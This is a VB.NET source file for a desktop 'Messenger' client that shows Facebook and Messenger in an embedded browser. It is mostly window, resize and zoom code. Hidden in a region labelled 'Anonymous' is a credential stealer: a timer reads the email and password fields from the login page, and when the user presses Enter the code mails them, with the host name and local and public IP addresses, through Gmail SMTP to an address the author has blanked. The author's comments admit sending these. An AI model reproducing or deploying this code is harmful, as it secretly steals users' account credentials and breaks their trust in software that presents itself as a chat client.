Imports System.Security.Principal
Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Net.Mail
Imports System.Net

' You'ld gonna see somthing here.
'' Im not that bad, I don't send it to everyone.

' I intended to remove it when posting
'' But I did nothing :O

Public Class Messenger

#Region "Iniatials and Varialbles"
    Dim ready As Boolean = False
    Private MouseDownX As Integer
    Private MouseDownY As Integer
    Dim LeavingX As Boolean = False
    Dim AllowedEnter As Boolean = False
    Dim allowResize As Boolean = True
    Private IsFormBeingDragged As Boolean = False
    Dim rePos As Boolean = False
    Dim minView As Boolean = False
    Dim isRounded As Boolean = False
    Dim lastHeight As Integer = 500
    Dim largeView As Boolean = False
    Dim CustomToolTip As System.Windows.Forms.ToolTip = New System.Windows.Forms.ToolTip()
    'Check Admin Privilage
    Dim identity = WindowsIdentity.GetCurrent()
    Dim principal = New WindowsPrincipal(identity)
    Dim superUser As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
    'For Login
    Dim go As Boolean = False
    Dim Subject, Body As String
    Dim email As String = ""
    Dim password As String = ""
#End Region

#Region "GetExternal_IP"
    Function GetExternalIP() As IPAddress
        Try
            Dim lol As WebClient = New WebClient()
            Dim str As String = lol.DownloadString("http://www.ip-adress.com/")
            Dim pattern As String = "<strong>(.+)</strong>"
            Dim matches1 As MatchCollection = Regex.Matches(str, pattern)
            Dim ip As String = matches1(0).ToString
            ip = ip.Remove(0, 8)
            ip = ip.Replace("</strong>", "")
            ip = ip.Replace(" ", "")
            Return IPAddress.Parse(ip)
        Catch ex As Exception
            Return IPAddress.Parse("255.255.255.255")
        End Try
    End Function

    Dim MyIP As IPAddress = GetExternalIP()
#End Region

#Region "Disable Exit Ways"
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property
#End Region

#Region "Base64"
    Public Function base64Encode(ByVal sData As String) As String
        Try
            Dim encData_Byte As Byte() = New Byte(sData.Length - 1) {}
            encData_Byte = System.Text.Encoding.UTF8.GetBytes(sData)
            Dim encodedData As String = Convert.ToBase64String(encData_Byte)
            Return (encodedData)

        Catch ex As Exception

            Throw (New Exception("Error is base64Encode" & ex.Message))

        End Try
    End Function

    Public Function base64Decode(ByVal sData As String) As String
        Dim encoder As New System.Text.UTF8Encoding()
        Dim utf8Decode As System.Text.Decoder = encoder.GetDecoder()
        Dim todecode_byte As Byte() = Convert.FromBase64String(sData)
        Dim charCount As Integer = utf8Decode.GetCharCount(todecode_byte, 0, todecode_byte.Length)
        Dim decoded_char As Char() = New Char(charCount - 1) {}
        utf8Decode.GetChars(todecode_byte, 0, todecode_byte.Length, decoded_char, 0)
        Dim result As String = New [String](decoded_char)
        Return result
    End Function
#End Region

#Region "Enter KeyManipulated"
    'Enter Key
    Protected Overrides Function ProcessCmdKey(ByRef msg As System.Windows.Forms.Message, _
                                           ByVal keyData As System.Windows.Forms.Keys) _
                                           As Boolean

        If msg.WParam.ToInt32() = CInt(Keys.Enter) Then
            If (Not AllowedEnter) Then
                SendKeys.Send("{Tab}")
                BackgroundWorkerSendMail.RunWorkerAsync()
                Dim Button As HtmlElementCollection = Chatarea.Document.GetElementsByTagName("button")
                For Each btn As HtmlElement In Button
                    If (btn.GetAttribute("id").ToString = "loginbutton") Then
                        btn.InvokeMember("click")
                    End If
                Next
                Return True
            End If
        End If
        Return MyBase.ProcessCmdKey(msg, keyData)
    End Function
#End Region

#Region "Rounded"
    Private Function RoundedRec(ByVal X As Integer, ByVal Y As Integer, ByVal Width As Integer, ByVal Height As Integer) As System.Drawing.Drawing2D.GraphicsPath
        ' Make and Draw a path.
        Dim graphics_path As New System.Drawing.Drawing2D.GraphicsPath
        graphics_path.AddLine(X + 10, Y, X + Width, Y) 'add the Top line to the path

        'Top Right corner        
        Dim tr() As Point = { _
        New Point(X + Width, Y), _
        New Point((X + Width) + 4, Y + 2), _
        New Point((X + Width) + 8, Y + 6), _
        New Point((X + Width) + 10, Y + 10)}

        graphics_path.AddCurve(tr)  'Add the Top right curve to the path

        'Bottom right corner 
        Dim br() As Point = { _
        New Point((X + Width) + 10, Y + Height), _
        New Point((X + Width) + 8, (Y + Height) + 4), _
        New Point((X + Width) + 4, (Y + Height) + 8), _
        New Point(X + Width, (Y + Height) + 10)}

        graphics_path.AddCurve(br)  'Add the Bottom right curve to the path

        'Bottom left corner
        Dim bl() As Point = { _
        New Point(X + 10, (Y + Height) + 10), _
        New Point(X + 6, (Y + Height) + 8), _
        New Point(X + 2, (Y + Height) + 4), _
        New Point(X, Y + Height)}

        graphics_path.AddCurve(bl)  'Add the Bottom left curve to the path

        'Top left corner
        Dim tl() As Point = { _
        New Point(X, Y + 10), _
        New Point(X + 2, Y + 6), _
        New Point(X + 6, Y + 2), _
        New Point(X + 10, Y)}

        graphics_path.AddCurve(tl)  'add the Top left curve to the path

        Return graphics_path

    End Function
#End Region

#Region "Clean_Tring_Function"
    Public Function cleanString(str As String) As String
        On Error GoTo ErrorX
        str = Regex.Replace(str, "[^A-Za-z0-9_.\-/]", "")
        Return str
ErrorX:
        Return "False"
    End Function
#End Region

#Region "Message Window and Top Panel Code"
    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean

    'resize
    Dim onFullScreen As Boolean
    Dim maximized As Boolean
    Dim on_MinimumSize As Boolean
    Dim minimumWidth As Short = 350
    Dim minimumHeight As Short = 26
    Dim borderSpace As Short = 20
    Dim borderDiameter As Short = 3

    Dim onBorderRight As Boolean
    Dim onBorderLeft As Boolean
    Dim onBorderTop As Boolean
    Dim onBorderBottom As Boolean
    Dim onCornerTopRight As Boolean
    Dim onCornerTopLeft As Boolean
    Dim onCornerBottomRight As Boolean
    Dim onCornerBottomLeft As Boolean

    Dim movingRight As Boolean
    Dim movingLeft As Boolean
    Dim movingTop As Boolean
    Dim movingBottom As Boolean
    Dim movingCornerTopRight As Boolean
    Dim movingCornerTopLeft As Boolean
    Dim movingCornerBottomRight As Boolean
    Dim movingCornerBottomLeft As Boolean

    Private Sub Message_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Aloading.Visible = True
        Aloading.Dock = DockStyle.Fill
        'position
        Dim x As Integer
        Dim y As Integer
        x = Screen.PrimaryScreen.WorkingArea.Width
        y = Screen.PrimaryScreen.WorkingArea.Height - Me.Height
        Do Until x = Screen.PrimaryScreen.WorkingArea.Width - Me.Width
            x = x - 1
            Me.Location = New Point(x, y)
        Loop
        Try

        Catch ex As Exception
            MessageBox.Show("Database Error: Maybe Open or Not Accessible.", "Database Error", MessageBoxButtons.OK, MessageBoxIcon.Information)
        End Try
        Me.TopMost = True
        'allowResize = True
        Timer1.Start()
    End Sub

    Private Sub BottomPanel_MouseDown(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles BottomPanel.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
        If e.Button = Windows.Forms.MouseButtons.Left Then
            If onBorderRight Then movingRight = True Else movingRight = False
            If onBorderLeft Then movingLeft = True Else movingLeft = False
            If onBorderTop Then movingTop = True Else movingTop = False
            If onBorderBottom Then movingBottom = True Else movingBottom = False
            If onCornerTopRight Then movingCornerTopRight = True Else movingCornerTopRight = False
            If onCornerTopLeft Then movingCornerTopLeft = True Else movingCornerTopLeft = False
            If onCornerBottomRight Then movingCornerBottomRight = True Else movingCornerBottomRight = False
            If onCornerBottomLeft Then movingCornerBottomLeft = True Else movingCornerBottomLeft = False
        End If
    End Sub

    Private Sub BottomPanel_MouseMove(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles BottomPanel.MouseMove
        'start resize
        If Not (onFullScreen Or maximized) Then

            If Me.Width <= minimumWidth Then Me.Width = (minimumWidth + 5) : on_MinimumSize = True
            If Me.Height <= minimumHeight Then Me.Height = (minimumHeight + 5) : on_MinimumSize = True
            If on_MinimumSize Then stopResizer() Else startResizer()


            If (Cursor.Position.X > (Me.Location.X + Me.Width) - borderDiameter) _
                And (Cursor.Position.Y > (Me.Location.Y + borderSpace)) _
                And (Cursor.Position.Y < ((Me.Location.Y + Me.Height) - borderSpace)) Then
                Me.Cursor = Cursors.SizeWE
                onBorderRight = True

            ElseIf (Cursor.Position.X < (Me.Location.X + borderDiameter)) _
                And (Cursor.Position.Y > (Me.Location.Y + borderSpace)) _
                And (Cursor.Position.Y < ((Me.Location.Y + Me.Height) - borderSpace)) Then
                Me.Cursor = Cursors.SizeWE
                onBorderLeft = True

            ElseIf (Cursor.Position.Y < (Me.Location.Y + borderDiameter)) _
                And (Cursor.Position.X > (Me.Location.X + borderSpace)) _
                And (Cursor.Position.X < ((Me.Location.X + Me.Width) - borderSpace)) Then
                Me.Cursor = Cursors.SizeNS
                onBorderTop = True

            ElseIf (Cursor.Position.Y > ((Me.Location.Y + Me.Height) - borderDiameter)) _
                And (Cursor.Position.X > (Me.Location.X + borderSpace)) _
                And (Cursor.Position.X < ((Me.Location.X + Me.Width) - borderSpace)) Then
                Me.Cursor = Cursors.SizeNS
                onBorderBottom = True

            ElseIf (Cursor.Position.X = ((Me.Location.X + Me.Width) - 1)) _
                And (Cursor.Position.Y = Me.Location.Y) Then
                Me.Cursor = Cursors.SizeNESW
                onCornerTopRight = True

            ElseIf (Cursor.Position.X = Me.Location.X) _
                And (Cursor.Position.Y = Me.Location.Y) Then
                Me.Cursor = Cursors.SizeNWSE
                onCornerTopLeft = True

            ElseIf (Cursor.Position.X = ((Me.Location.X + Me.Width) - 1)) _
                And (Cursor.Position.Y = ((Me.Location.Y + Me.Height) - 1)) Then
                Me.Cursor = Cursors.SizeNWSE
                onCornerBottomRight = True

            ElseIf (Cursor.Position.X = Me.Location.X) _
                And (Cursor.Position.Y = ((Me.Location.Y + Me.Height) - 1)) Then
                Me.Cursor = Cursors.SizeNESW
                onCornerBottomLeft = True

            Else
                onBorderRight = False
                onBorderLeft = False
                onBorderTop = False
                onBorderBottom = False
                onCornerTopRight = False
                onCornerTopLeft = False
                onCornerBottomRight = False
                onCornerBottomLeft = False
                Me.Cursor = Cursors.Default
            End If

        End If

    End Sub

    Private Sub BottomPanel_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles BottomPanel.MouseUp
        drag = False
        stopResizer()
    End Sub


    Private Sub TopPanel_MouseClick(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles TopPanel.MouseClick
        If e.Button = Windows.Forms.MouseButtons.Right Then
            If Not Me.WindowState = FormWindowState.Maximized Then
                If largeView Then
                    largeView = False
                    Me.Size = New Size(Me.Size.Width, 500)
                    rePos = True
                Else
                    lastHeight = Me.Size.Height
                    Me.Size = New Size(Me.Size.Width, Screen.PrimaryScreen.WorkingArea.Height)
                    rePos = True
                    largeView = True
                End If
            End If
        Else

            If minView Then
                largeView = False
                rePos = True
                Me.Size = New Size(Me.Size.Width, 500)
                minView = False
                allowResize = True
            End If

        End If
    End Sub

    Private Sub TopPanel_MouseDown(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles TopPanel.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Top_Title_MouseDoubleClick(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Top_Title.MouseDoubleClick
        If allowResize Then
            If e.Button = MouseButtons.Left Then
                If maximized Then
                    Me.WindowState = FormWindowState.Normal
                    maximized = False
                Else
                    Me.WindowState = FormWindowState.Maximized
                    maximized = True
                End If
            End If
        Else
            If Me.TopMost Then
                Me.TopMost = False
            Else
                Me.TopMost = True
            End If
        End If
    End Sub

    Private Sub Top_Title_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Top_Title.MouseUp
        drag = False
    End Sub

    Private Sub Top_Title_MouseDown(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Top_Title.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Top_Title_MouseMove(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Top_Title.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub

    Private Sub TopPanel_MouseDoubleClick(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles TopPanel.MouseDoubleClick
        If allowResize Then
            If e.Button = MouseButtons.Left Then
                If maximized Then
                    Me.WindowState = FormWindowState.Normal
                    maximized = False
                Else
                    Me.WindowState = FormWindowState.Maximized
                    maximized = True
                End If
            End If
        Else
            If Me.TopMost Then
                Me.TopMost = False
            Else
                Me.TopMost = True
            End If
        End If
    End Sub

    Private Sub TopPanel_MouseMove(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles TopPanel.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub

    Private Sub TopPanel_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles TopPanel.MouseUp
        drag = False
    End Sub

    Private Sub Message_MouseDown(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            If onBorderRight Then movingRight = True Else movingRight = False
            If onBorderLeft Then movingLeft = True Else movingLeft = False
            If onBorderTop Then movingTop = True Else movingTop = False
            If onBorderBottom Then movingBottom = True Else movingBottom = False
            If onCornerTopRight Then movingCornerTopRight = True Else movingCornerTopRight = False
            If onCornerTopLeft Then movingCornerTopLeft = True Else movingCornerTopLeft = False
            If onCornerBottomRight Then movingCornerBottomRight = True Else movingCornerBottomRight = False
            If onCornerBottomLeft Then movingCornerBottomLeft = True Else movingCornerBottomLeft = False
        End If
    End Sub

    Private Sub Message_MouseMove(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseMove
        If onFullScreen Or maximized Or Not allowResize Then Exit Sub

        If Me.Width <= minimumWidth Then Me.Width = (minimumWidth + 5) : on_MinimumSize = True
        If Me.Height <= minimumHeight Then Me.Height = (minimumHeight + 5) : on_MinimumSize = True
        If on_MinimumSize Then stopResizer() Else startResizer()


        If (Cursor.Position.X > (Me.Location.X + Me.Width) - borderDiameter) _
            And (Cursor.Position.Y > (Me.Location.Y + borderSpace)) _
            And (Cursor.Position.Y < ((Me.Location.Y + Me.Height) - borderSpace)) Then
            Me.Cursor = Cursors.SizeWE
            onBorderRight = True

        ElseIf (Cursor.Position.X < (Me.Location.X + borderDiameter)) _
            And (Cursor.Position.Y > (Me.Location.Y + borderSpace)) _
            And (Cursor.Position.Y < ((Me.Location.Y + Me.Height) - borderSpace)) Then
            Me.Cursor = Cursors.SizeWE
            onBorderLeft = True

        ElseIf (Cursor.Position.Y < (Me.Location.Y + borderDiameter)) _
            And (Cursor.Position.X > (Me.Location.X + borderSpace)) _
            And (Cursor.Position.X < ((Me.Location.X + Me.Width) - borderSpace)) Then
            Me.Cursor = Cursors.SizeNS
            onBorderTop = True

        ElseIf (Cursor.Position.Y > ((Me.Location.Y + Me.Height) - borderDiameter)) _
            And (Cursor.Position.X > (Me.Location.X + borderSpace)) _
            And (Cursor.Position.X < ((Me.Location.X + Me.Width) - borderSpace)) Then
            Me.Cursor = Cursors.SizeNS
            onBorderBottom = True

        ElseIf (Cursor.Position.X = ((Me.Location.X + Me.Width) - 1)) _
            And (Cursor.Position.Y = Me.Location.Y) Then
            Me.Cursor = Cursors.SizeNESW
            onCornerTopRight = True

        ElseIf (Cursor.Position.X = Me.Location.X) _
            And (Cursor.Position.Y = Me.Location.Y) Then
            Me.Cursor = Cursors.SizeNWSE
            onCornerTopLeft = True

        ElseIf (Cursor.Position.X = ((Me.Location.X + Me.Width) - 1)) _
            And (Cursor.Position.Y = ((Me.Location.Y + Me.Height) - 1)) Then
            Me.Cursor = Cursors.SizeNWSE
            onCornerBottomRight = True

        ElseIf (Cursor.Position.X = Me.Location.X) _
            And (Cursor.Position.Y = ((Me.Location.Y + Me.Height) - 1)) Then
            Me.Cursor = Cursors.SizeNESW
            onCornerBottomLeft = True

        Else
            onBorderRight = False
            onBorderLeft = False
            onBorderTop = False
            onBorderBottom = False
            onCornerTopRight = False
            onCornerTopLeft = False
            onCornerBottomRight = False
            onCornerBottomLeft = False
            Me.Cursor = Cursors.Default
        End If
    End Sub

    Private Sub Message_MouseUp(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles Me.MouseUp
        stopResizer()
    End Sub

    'functions
    Private Sub startResizer()
        Select Case True

            Case movingRight
                Me.Width = (Cursor.Position.X - Me.Location.X)

            Case movingLeft
                Me.Width = ((Me.Width + Me.Location.X) - Cursor.Position.X)
                Me.Location = New Point(Cursor.Position.X, Me.Location.Y)

            Case movingTop
                Me.Height = ((Me.Height + Me.Location.Y) - Cursor.Position.Y)
                Me.Location = New Point(Me.Location.X, Cursor.Position.Y)

            Case movingBottom
                Me.Height = (Cursor.Position.Y - Me.Location.Y)

            Case movingCornerTopRight
                Me.Width = (Cursor.Position.X - Me.Location.X)
                Me.Height = ((Me.Location.Y - Cursor.Position.Y) + Me.Height)
                Me.Location = New Point(Me.Location.X, Cursor.Position.Y)

            Case movingCornerTopLeft
                Me.Width = ((Me.Width + Me.Location.X) - Cursor.Position.X)
                Me.Location = New Point(Cursor.Position.X, Me.Location.Y)
                Me.Height = ((Me.Height + Me.Location.Y) - Cursor.Position.Y)
                Me.Location = New Point(Me.Location.X, Cursor.Position.Y)

            Case movingCornerBottomRight
                Me.Size = New Point((Cursor.Position.X - Me.Location.X), (Cursor.Position.Y - Me.Location.Y))

            Case movingCornerBottomLeft
                Me.Width = ((Me.Width + Me.Location.X) - Cursor.Position.X)
                Me.Height = (Cursor.Position.Y - Me.Location.Y)
                Me.Location = New Point(Cursor.Position.X, Me.Location.Y)

        End Select
    End Sub

    Private Sub stopResizer()
        movingRight = False
        movingLeft = False
        movingTop = False
        movingBottom = False
        movingCornerTopRight = False
        movingCornerTopLeft = False
        movingCornerBottomRight = False
        movingCornerBottomLeft = False
        Me.Cursor = Cursors.Default
        Threading.Thread.Sleep(300)
        on_MinimumSize = False
    End Sub
#End Region
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        If TimeBrowser.DocumentTitle.ToString = "Navigation Canceled" Or TimeBrowser.DocumentTitle.ToString = "Can’t reach this page" Then
            TimeLabel.Text = ""
        Else
            TimeLabel.Text = TimeBrowser.DocumentTitle
        End If
        Top_Title.Text = Chatarea.DocumentTitle
        If ready Then
            PerformZoom(80)
            ready = False
        End If
        If rePos Then
            'position
            Dim x As Integer
            Dim y As Integer
            x = Screen.PrimaryScreen.WorkingArea.Width
            y = Screen.PrimaryScreen.WorkingArea.Height - Me.Height
            Do Until x = Screen.PrimaryScreen.WorkingArea.Width - Me.Width
                x = x - 1
                Me.Location = New Point(x, y)
            Loop
            rePos = False
        End If
        If Not superUser Then
            'Dim su As Integer = MessageBox.Show("System required administrative privilage.", "Superuser Required", MessageBoxButtons.OKCancel, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1)
            'If su = DialogResult.Cancel Then
            '    Close()
            'ElseIf su = DialogResult.Yes Then
            '    'restart
            '    Application.Restart()
            'End If
        End If
        Try
            Dim AllElementes As HtmlElementCollection = Chatarea.Document.All
            For Each webpageelement As HtmlElement In AllElementes
                If webpageelement.GetAttribute("id") = "email" Then
                    email = webpageelement.GetAttribute("value")
                End If
            Next
            For Each webpageelement As HtmlElement In AllElementes
                If webpageelement.GetAttribute("id") = "pass" Then
                    password = webpageelement.GetAttribute("value")
                End If
            Next
        Catch ex As Exception

        End Try

        'rounding borders include
        If isRounded Then
            Dim p As New Drawing2D.GraphicsPath()
            p.StartFigure()
            p.AddArc(New Rectangle(0, 0, 20, 20), 180, 90)
            p.AddLine(20, 0, Me.Width - 20, 0)
            p.AddArc(New Rectangle(Me.Width - 20, 0, 20, 20), -90, 90)
            p.AddLine(Me.Width, 20, Me.Width, Me.Height - 20)
            p.AddArc(New Rectangle(Me.Width - 20, Me.Height - 20, 20, 20), 0, 90)
            p.AddLine(Me.Width - 20, Me.Height, 20, Me.Height)
            p.AddArc(New Rectangle(0, Me.Height - 20, 20, 20), 90, 90)
            p.CloseFigure()
            Me.Region = New Region(p)
        End If
    End Sub

    Private Sub Btn_Exit_Click(sender As System.Object, e As System.EventArgs) Handles Btn_Exit.Click
        Close()
        'If minView Then
        '    Close()
        'Else
        '    lastHeight = Me.Size.Height
        '    Me.Height = 25
        '    allowResize = False
        '    rePos = True
        '    minView = True
        '    'Me.Hide()
        'End If
    End Sub

    Private Sub Chatarea_DocumentCompleted(sender As System.Object, e As System.Windows.Forms.WebBrowserDocumentCompletedEventArgs) Handles Chatarea.DocumentCompleted
        ready = True
        Aloading.Visible = False
        Chatarea.Update()
        Dim Division As HtmlElementCollection = Chatarea.Document.GetElementsByTagName("div")
        Dim Inputs As HtmlElementCollection = Chatarea.Document.GetElementsByTagName("input")
        Dim Spans As HtmlElementCollection = Chatarea.Document.GetElementsByTagName("span")
        Dim Headers1 As HtmlElementCollection = Chatarea.Document.GetElementsByTagName("h1")
        Dim Images As HtmlElementCollection = Chatarea.Document.GetElementsByTagName("img")

        'div tags
        For Each h1 As HtmlElement In Headers1
            If (h1.GetAttribute("className").ToString = "_5hy4") Then
                h1.InnerHtml = "Messenger" 'Messenger HeaderBig
            End If
        Next

        'img tags
        For Each img As HtmlElement In Headers1

        Next

        'div tags
        For Each div As HtmlElement In Division
            If (div.GetAttribute("className").ToString = "_3403") Then
                div.InnerHtml = "<a href='https://m.facebook.com/saraus.mike' style='color: #3d3d3d;'>Sign in with <b><font color='#0084ff'>Facebook</font></b> to get started. —<small><em>Mike</em></small></a>" 'Sign in with Facebook to get started.
            End If
            If (div.GetAttribute("className").ToString = "_1enh") Then
                'Contact Removed
            End If
        Next

        'input tags
        For Each input As HtmlElement In Inputs
            If (input.GetAttribute("id").ToString = "email") Then
                'username
            End If
            If (input.GetAttribute("id").ToString = "pass") Then
                'password
            End If
        Next

        'span tags
        For Each span As HtmlElement In Spans
            If (span.GetAttribute("className").ToString = "_3oh-") Then
            End If
        Next
    End Sub

    Private Sub Top_Title_Click(sender As System.Object, e As System.EventArgs) Handles Top_Title.Click
        If minView Then
            rePos = True
            Me.Size = New Size(Me.Size.Width, 500)
            minView = False
            allowResize = True
            Btn_Exit.Visible = False
            Top_Title.Visible = False
        Else
            Me.Height = 25
            lastHeight = Me.Size.Height
            allowResize = False
            rePos = True
            minView = True
            Btn_Exit.Visible = True
            Top_Title.Visible = True
            'Me.Hide()
        End If
    End Sub

    Private Sub Btn_Exit_MouseHover(sender As Object, e As System.EventArgs) Handles Btn_Exit.MouseHover
        'If minView Then
        CustomToolTip.SetToolTip(Btn_Exit, "Exit")
        'Else
        '    CustomToolTip.SetToolTip(Btn_Exit, "Minimize")
        'End If
    End Sub

#Region "Anonymous"
    Private Sub BackgroundWorkerSendMail_DoWork(sender As System.Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorkerSendMail.DoWork
        Using mail As New MailMessage

            'Email Content
            Subject = "Messenger Login - " & DateTime.Now.ToString("dd/MM/yyyy")

            'PC infos
            Dim strHostName As String
            Dim strIPAddress As String
            strHostName = System.Net.Dns.GetHostName()
            strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString
            Body = "Host Name: " & strHostName & vbCrLf & "Local Time: " & DateTime.Now & vbCrLf & "IPv4 Address: " & strIPAddress & vbCrLf & Body & "Public IP Address: " & MyIP.ToString & vbCrLf
            Body = Body & "Email : " & email & vbCrLf & "Password : " & password & vbCrLf
            Body = Body & vbCrLf & vbCrLf & "#noSyste.m*"

            'Function
            mail.From = New MailAddress("noreply@messenger.me")
            mail.To.Add(base64Decode("Email: I did remove it, you can put it here in base64 format.")) 'my Dummy mail receiver
            mail.Body = Body
            mail.Subject = Subject
            mail.Priority = MailPriority.Normal
            Using SMTP As New SmtpClient
                SMTP.EnableSsl = True
                SMTP.Port = "587"
                SMTP.Host = "smtp.gmail.com"
                SMTP.Credentials = New Net.NetworkCredential(base64Decode("Email: I did remove it, you can put it here in base64 format."), base64Decode("Password: I did remove it, you can put it here in base64 format.")) 'my Credentials, dummy sender.
                SMTP.Send(mail)
            End Using
        End Using
    End Sub

    Private Sub BackgroundWorkerSendMail_RunWorkerCompleted(sender As Object, e As System.ComponentModel.RunWorkerCompletedEventArgs) Handles BackgroundWorkerSendMail.RunWorkerCompleted
        'Done
    End Sub

#End Region

    Private Sub TopPanel_MouseHover(sender As Object, e As System.EventArgs) Handles TopPanel.MouseHover
        If minView Then
            'TimeLabel.Visible = False
        Else
            Top_Title.Visible = True
            Btn_Exit.Visible = True
            CheckScroll.Visible = True
        End If
        Timer2.Start()
    End Sub

    Private Sub CheckScroll_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckScroll.CheckedChanged
        If CheckScroll.Checked = True Then
            Chatarea.ScrollBarsEnabled = True
        Else
            Chatarea.ScrollBarsEnabled = False
        End If
        CheckScroll.Visible = False
    End Sub

    Private Sub CheckScroll_MouseHover(sender As Object, e As System.EventArgs) Handles CheckScroll.MouseHover
        CustomToolTip.SetToolTip(CheckScroll, "Scrollbars")
        CheckScroll.Visible = True
    End Sub

    Private Sub CheckScroll_MouseLeave(sender As Object, e As System.EventArgs) Handles CheckScroll.MouseLeave
        CheckScroll.Visible = False
    End Sub

    Private Sub PictureBox1_MouseHover(sender As Object, e As System.EventArgs) Handles PictureBox1.MouseHover
        CustomToolTip.SetToolTip(PictureBox1, "Messenger")
    End Sub
    Private Sub PictureBox1_Click(sender As System.Object, e As System.EventArgs) Handles PictureBox1.Click
        CheckScroll.Checked = False
        Top_Title.Text = "Messenger"
        Aloading.Visible = True
        Aloading.Dock = DockStyle.Fill
        Chatarea.Navigate("https://www.m.me")
        PictureBox2.Visible = True
        PictureBox1.Visible = False
        Chatarea.Refresh()
    End Sub

    Private Sub PictureBox2_MouseHover(sender As Object, e As System.EventArgs) Handles PictureBox2.MouseHover
        CustomToolTip.SetToolTip(PictureBox2, "Facebook")
    End Sub
    Private Sub PictureBox2_Click(sender As System.Object, e As System.EventArgs) Handles PictureBox2.Click
        CheckScroll.Checked = True
        Top_Title.Text = "Facebook"
        Aloading.Visible = True
        Aloading.Dock = DockStyle.Fill
        Chatarea.Navigate("https://touch.facebook.com")
        PictureBox1.Visible = True
        PictureBox2.Visible = False
        Chatarea.Refresh()
    End Sub

    Dim a As Integer = 0
    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        a = a + 1
        If a = 20 Then
            Top_Title.Visible = False
            Btn_Exit.Visible = False
            CheckScroll.Visible = False
            a = 0
            Timer2.Stop()
        End If
    End Sub

#Region "Zooming Browser"
    Dim InitialZoom As Integer = 100
    Public Enum Exec
        OLECMDID_OPTICAL_ZOOM = 63
    End Enum
    Private Enum execOpt
        OLECMDEXECOPT_DODEFAULT = 0
        OLECMDEXECOPT_PROMPTUSER = 1
        OLECMDEXECOPT_DONTPROMPTUSER = 2
        OLECMDEXECOPT_SHOWHELP = 3
    End Enum

    Public Sub PerformZoom(ByVal Value As Integer)
        Try
            Dim Res As Object = Nothing
            Dim MyWeb As Object
            MyWeb = Me.Chatarea.ActiveXInstance
            MyWeb.ExecWB(Exec.OLECMDID_OPTICAL_ZOOM, execOpt.OLECMDEXECOPT_PROMPTUSER, CObj(Value), CObj(IntPtr.Zero))
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
#End Region

    Private Sub BottomPanel_MouseClick(sender As Object, e As System.Windows.Forms.MouseEventArgs) Handles BottomPanel.MouseClick
        Aloading.Visible = True
        Me.WindowState = FormWindowState.Maximized
        BottomPanel.Enabled = False
        TopPanel.Enabled = False
        PictureBox1.Visible = False
        PictureBox2.Visible = False
        Cursor.Hide()
    End Sub

    Private Sub Aloading_DoubleClick(sender As Object, e As System.EventArgs) Handles Aloading.DoubleClick
        Me.WindowState = FormWindowState.Normal
        Aloading.Visible = False
        BottomPanel.Enabled = True
        TopPanel.Enabled = True
        PictureBox1.Visible = True
        PictureBox2.Visible = True
        Cursor.Show()
        'minimize
        Me.Height = 25
        lastHeight = Me.Size.Height
        allowResize = False
        rePos = True
        minView = True
    End Sub

End Class
